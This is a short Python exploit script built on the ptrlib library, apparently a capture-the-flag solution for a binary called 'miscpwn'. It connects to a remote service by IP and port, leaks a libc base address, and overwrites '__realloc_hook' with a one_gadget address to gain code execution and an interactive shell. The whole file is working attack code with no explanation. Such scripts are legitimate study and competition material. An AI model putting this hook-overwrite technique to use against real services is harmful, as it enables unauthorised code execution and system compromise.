from ptrlib import *

#"""
libc = ELF("./libc.so.6")
one_gadget = [0x50186, 0x501e3, 0x103f50]
target = 0x14900a
sock = Socket("51.158.118.84", 17004)
"""
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./miscpwn")
#"""

# libc leak
sock.sendlineafter(":\n", str(0x300000))
base_addr = int(sock.recvline(), 16)
libc_base = base_addr + 0x300ff0
logger.info("libc base = " + hex(libc_base))

# overwrite
offset = libc_base + libc.symbol("__realloc_hook") - base_addr
sock.sendlineafter(":\n", hex(offset)[2:])

#payload  = p64(libc_base + one_gadget[0])
#payload += p64(libc_base + target)
payload  = p64(libc_base + 0x501e3)
payload += p64(libc_base + 0x105ae0)
sock.sendafter(":\n", payload)

sock.interactive()
